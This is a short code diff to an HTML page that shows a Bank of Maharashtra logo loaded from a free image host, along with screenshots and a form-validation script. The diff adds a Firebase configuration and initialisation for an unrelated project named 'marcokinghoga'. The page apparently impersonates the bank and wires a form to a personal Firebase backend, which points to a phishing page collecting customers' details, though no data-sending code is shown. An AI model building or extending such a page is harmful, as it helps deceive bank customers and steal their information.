@@ -80,6 +80,7 @@
   </style>
 </head>
 <body>
+
   <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Meri Tasveer">
 
   <div class="headline">
@@ -110,6 +111,25 @@
     <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
     <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
   </div>
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    // Firebase import
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
+      authDomain: "marcokinghoga.firebaseapp.com",
+      projectId: "marcokinghoga",
+      storageBucket: "marcokinghoga.firebasestorage.app",
+      messagingSenderId: "132474071601",
+      appId: "1:132474071601:web:7c44a66fca6dc000e90310"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+  </script>
 
   <script>
     function validateForm() {
